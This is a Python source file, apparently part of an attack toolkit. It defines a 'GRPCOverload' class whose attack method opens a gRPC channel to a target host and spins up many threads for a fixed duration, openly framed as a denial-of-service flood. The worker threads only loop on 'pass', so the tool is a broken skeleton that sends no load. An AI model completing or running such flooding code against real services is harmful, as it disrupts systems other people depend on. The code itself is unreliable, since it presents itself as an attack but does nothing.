import grpc
import threading
import time
from utils.logger import logger
from config.settings import config

class GRPCOverload:
    def __init__(self):
        self.running = False

    def attack(self, target, port=50051, threads=20, duration=30):
        self.running = True
        logger.info(f"gRPC overload on {target}:{port}")

        channel = grpc.insecure_channel(f'{target}:{port}')

        def worker():
            while self.running:
                try:
                    # Replace with a real RPC call if you have the stub
                    # For demo, just keep the channel open
                    pass
                except:
                    pass

        workers = []
        for _ in range(threads):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            workers.append(t)

        time.sleep(duration)
        self.running = False
        for t in workers:
            t.join()
        logger.info("gRPC overload finished")